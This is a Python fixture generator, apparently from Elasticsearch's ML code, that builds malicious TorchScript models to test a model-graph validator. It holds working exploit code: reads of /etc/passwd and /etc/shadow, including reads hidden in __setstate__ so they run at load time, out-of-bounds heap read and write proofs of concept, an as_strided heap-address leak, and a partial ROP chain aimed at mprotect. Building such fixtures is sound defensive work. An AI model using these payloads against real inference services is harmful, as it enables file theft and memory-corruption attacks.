#!/usr/bin/env python3
#
# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0 and the following additional limitation. Functionality enabled by the
# files subject to the Elastic License 2.0 may only be used in production when
# invoked by an Elasticsearch process with a license key installed that permits
# use of machine learning features. You may not use this file except in
# compliance with the Elastic License 2.0 and the foregoing additional
# limitation.
#
"""Generate malicious TorchScript model fixtures for validator integration tests.

Each model is designed to exercise a specific attack vector that the
CModelGraphValidator must detect and reject.

Usage:
    python3 generate_malicious_models.py [output_dir]

The output directory defaults to the same directory as this script.
"""

import os
import sys
from pathlib import Path

import torch
from torch import Tensor
from typing import Optional, Tuple


# --- Malicious model definitions ---


class FileReaderModel(torch.nn.Module):
    """Uses aten::from_file to read arbitrary files from disk."""
    def forward(self, x: Tensor) -> Tensor:
        stolen = torch.from_file("/etc/passwd", size=100)
        return stolen


class MixedFileReaderModel(torch.nn.Module):
    """Mixes allowed ops with a forbidden aten::from_file call."""
    def forward(self, x: Tensor) -> Tensor:
        y = x + x
        z = torch.from_file("/etc/shadow", size=10)
        return y + z


class HiddenInSubmodule(torch.nn.Module):
    """Hides aten::logit (unrecognised) three levels deep in submodules.

    Uses logit+clamp instead of sin so the fixture stays invalid when
    aten::sin is added to the allowlist for transformer models (e.g. EuroBERT).
    """
    def __init__(self):
        super().__init__()
        self.inner = _Inner()

    def forward(self, x: Tensor) -> Tensor:
        y = x * x
        return self.inner(y)


class _Inner(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.leaf = _Leaf()

    def forward(self, x: Tensor) -> Tensor:
        return self.leaf(x) + x


class _Leaf(torch.nn.Module):
    def forward(self, x: Tensor) -> Tensor:
        return torch.logit(torch.clamp(x, 1e-6, 1.0 - 1e-6))


class ConditionalMalicious(torch.nn.Module):
    """Hides an unrecognised op (aten::sin) inside one branch of a conditional."""
    def forward(self, x: Tensor) -> Tensor:
        if x.sum() > 0:
            return torch.sin(x)
        else:
            return x + x


class ManyUnrecognisedOps(torch.nn.Module):
    """Uses several different unrecognised ops to simulate an unexpected arch."""
    def forward(self, x: Tensor) -> Tensor:
        a = torch.sin(x)
        b = torch.cos(x)
        c = torch.tan(x)
        d = torch.exp(x)
        return a + b + c + d


class FileReaderInSubmodule(torch.nn.Module):
    """Hides the forbidden aten::from_file inside a submodule."""
    def __init__(self):
        super().__init__()
        self.reader = _FileReaderChild()

    def forward(self, x: Tensor) -> Tensor:
        return x + self.reader(x)


class _FileReaderChild(torch.nn.Module):
    def forward(self, x: Tensor) -> Tensor:
        return torch.from_file("/tmp/secret", size=10)


# --- inductor::_reinterpret_tensor OOB models (privately reported finding) ---
#
# Bypass of the aten::as_strided forbid: TorchInductor's _reinterpret_tensor
# takes an unchecked storage offset and yields the same class of OOB heap
# read/write.  Both appear in the forward graph, so they are caught by the
# post-load validator now that inductor::_reinterpret_tensor is forbidden.


class ReinterpretTensorOobRead(torch.nn.Module):
    """OOB heap read via inductor::_reinterpret_tensor (reporter PoC)."""
    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp = torch.tensor([1, 2, 3, 4, 5, 6, 7, 8])
        out: list[str] = [""]
        for i in range(1, 1000):
            target = torch.ops.inductor._reinterpret_tensor(tmp, [1], [1], i)
            out.append(hex(target.item()))
        assert 1 == 2, out
        return tmp


class ReinterpretTensorOobWrite(torch.nn.Module):
    """OOB heap write via inductor::_reinterpret_tensor + fill_ (reporter PoC)."""
    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp = torch.tensor([1, 2, 3, 4, 5, 6, 7, 8])
        acc = torch.zeros(1)
        for i in range(1, 100):
            target = torch.ops.inductor._reinterpret_tensor(tmp, [1], [1], i)
            target.fill_(0)
            acc = acc + target
        return acc


# --- Load-time execution models (__setstate__) ---
#
# TorchScript serialises a module's __setstate__ method and runs it *during*
# torch::jit::load(), before the loaded Module is ever handed to
# CModelGraphValidator.  Because the validator only walks the (inlined) forward
# graph, a forbidden op hidden in __setstate__ is invisible to it AND has
# already executed by the time validation would run.  These fixtures reproduce
# that gap: their forward graphs are benign, so the current validator accepts
# them, yet loading them triggers aten::from_file at deserialization time.


class SetStateFileReaderModel(torch.nn.Module):
    """aten::from_file hidden in __setstate__ — executes during load.

    The forbidden op never appears in forward(), so the post-load graph
    validator (which inspects only the forward graph) does not see it.  Worse,
    torch::jit::load() runs __setstate__ before validation happens at all, so
    the file read has already fired.  This is the load-time execution gap
    identified in security review.
    """
    def __init__(self) -> None:
        super().__init__()
        self.w = torch.zeros(1)

    @torch.jit.export
    def __getstate__(self) -> Tuple[Tensor, bool]:
        return (self.w, self.training)

    @torch.jit.export
    def __setstate__(self, state: Tuple[Tensor, bool]) -> None:
        # Runs at deserialization time, before any graph validation.
        leaked = torch.from_file("/etc/passwd", size=100)
        self.w = state[0] + leaked[0]
        self.training = state[1]

    def forward(self, x: Tensor) -> Tensor:
        return x + self.w


class SetStateFileReaderInSubmodule(torch.nn.Module):
    """Same load-time attack, but hidden in a submodule's __setstate__.

    Confirms that a pre-load scan must recurse into every serialised
    __setstate__ in the archive, not just the top-level module's.
    """
    def __init__(self) -> None:
        super().__init__()
        self.child = _SetStateFileReaderChild()

    def forward(self, x: Tensor) -> Tensor:
        return x + self.child(x)


class _SetStateFileReaderChild(torch.nn.Module):
    def __init__(self) -> None:
        super().__init__()
        self.w = torch.zeros(1)

    @torch.jit.export
    def __getstate__(self) -> Tuple[Tensor, bool]:
        return (self.w, self.training)

    @torch.jit.export
    def __setstate__(self, state: Tuple[Tensor, bool]) -> None:
        leaked = torch.from_file("/tmp/secret", size=10)
        self.w = state[0] + leaked[0]
        self.training = state[1]

    def forward(self, x: Tensor) -> Tensor:
        return x + self.w


# --- Sandbox2 attack models (PR #2873) ---
#
# These reproduce real-world attack vectors that exploit torch.as_strided
# to leak heap addresses and build ROP chains.  The graph validator must
# reject them because as_strided (and several helper ops) are not in the
# transformer-architecture allowlist.


class HeapLeakModel(torch.nn.Module):
    """Leaks heap addresses via torch.as_strided with a malicious storage offset.

    The attack scans the heap for libtorch pointers by reading out-of-bounds
    memory through a strided view.  Key unrecognised ops: aten::as_strided,
    aten::item, aten::__rshift__.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (leak[i + 3].item() == leak[i + 5].item()
                    and leak[i + 3].item() >> 40 == 127):
                if (leak[i + 2].item() >= 0x100000000
                        and leak[i + 2].item() <= 0x100000005):
                    index.append(i)
        return (index, leak)

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [
                0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                assert 1 == 0, "leak: " + hex(libtorch_cpu_addr)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


class RopExploitModel(torch.nn.Module):
    """Builds a ROP chain to mprotect heap memory and execute shellcode.

    Extends the heap-leak technique to overwrite function pointers and
    chain gadgets that call mprotect followed by attacker-controlled
    shellcode that writes files to disk.  Key unrecognised ops:
    aten::as_strided, aten::copy_, aten::Delete.
    """
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length)
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (leak[i + 3].item() == leak[i + 5].item()
                    and leak[i + 3].item() >> 40 == 127):
                if (leak[i + 2].item() >= 0x100000000
                        and leak[i + 2].item() <= 0x100000005):
                    index.append(i)
        return (index, leak)

    def get_address_data(self, leak: Tensor, index: int,
                         tmp: list[Tensor], target_addr: int) -> int:
        leak[index] = target_addr
        return int(tmp[0].item())

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xdead00000 + i] + [
                0xdead00000 + j for j in range(2, array_len)]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xc878b50
                leak[index + 3] = int(heap_addr - 0x8)
                for j in range(heap_len):
                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
                        mprotect_got_addr = 0xc9785f0 + libtorch_cpu_addr
                        self.get_address_data(
                            leak, index + 3, tmp[j:j + 1],
                            int(mprotect_got_addr))
                        del tmp[j]
                        assert 1 == 0, "exploit"
                        return torch.zeros(0)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


# --- Generation logic ---


def _collect_setstate_ops(scripted: torch.jit.ScriptModule) -> set:
    """Collect ops from every __setstate__ in the module tree.

    __setstate__ runs during torch::jit::load(), so ops here execute before
    (and are invisible to) the forward-graph validator.  Surfacing them makes
    the load-time attack fixtures self-documenting.
    """
    ops: set = set()
    for submodule in scripted.modules():
        try:
            graph = submodule._c._get_method("__setstate__").graph
        except (RuntimeError, AttributeError):
            continue
        ops.update(node.kind() for node in graph.nodes())
    return ops


MODELS = {
    "malicious_file_reader.pt": FileReaderModel,
    "malicious_mixed_file_reader.pt": MixedFileReaderModel,
    "malicious_hidden_in_submodule.pt": HiddenInSubmodule,
    "malicious_conditional.pt": ConditionalMalicious,
    "malicious_many_unrecognised.pt": ManyUnrecognisedOps,
    "malicious_file_reader_in_submodule.pt": FileReaderInSubmodule,
    "malicious_reinterpret_tensor_oob_read.pt": ReinterpretTensorOobRead,
    "malicious_reinterpret_tensor_oob_write.pt": ReinterpretTensorOobWrite,
    "malicious_setstate_file_reader.pt": SetStateFileReaderModel,
    "malicious_setstate_file_reader_in_submodule.pt": SetStateFileReaderInSubmodule,
    "malicious_heap_leak.pt": HeapLeakModel,
    "malicious_rop_exploit.pt": RopExploitModel,
}


def generate(output_dir: Path):
    output_dir.mkdir(parents=True, exist_ok=True)
    succeeded = []
    failed = []

    for filename, cls in MODELS.items():
        print(f"  {filename}...", end=" ")
        try:
            model = cls()
            model.eval()
            scripted = torch.jit.script(model)
            path = output_dir / filename
            torch.jit.save(scripted, str(path))
            size = path.stat().st_size
            print(f"OK ({size} bytes)")

            # Show ops for verification
            graph = scripted.forward.graph.copy()
            torch._C._jit_pass_inline(graph)
            ops = sorted(set(n.kind() for n in graph.nodes()))
            print(f"    forward ops: {ops}")

            # Surface ops hidden in __setstate__ (executed at load time).
            setstate_ops = _collect_setstate_ops(scripted)
            if setstate_ops:
                print(f"    __setstate__ ops (run at load): {sorted(setstate_ops)}")

            succeeded.append(filename)
        except Exception as exc:
            print(f"FAILED: {exc}")
            failed.append((filename, str(exc)))

    print(f"\nGenerated {len(succeeded)}/{len(MODELS)} models")
    if failed:
        print("Failed:")
        for name, err in failed:
            print(f"  {name}: {err}")
    return len(failed) == 0


if __name__ == "__main__":
    out_dir = (Path(sys.argv[1]) if len(sys.argv) > 1
               else Path(__file__).resolve().parent.parent
               / "bin" / "pytorch_inference" / "unittest" / "testfiles" / "malicious_models")
    print(f"Generating malicious model fixtures in {out_dir}")
    success = generate(out_dir)
    sys.exit(0 if success else 1)
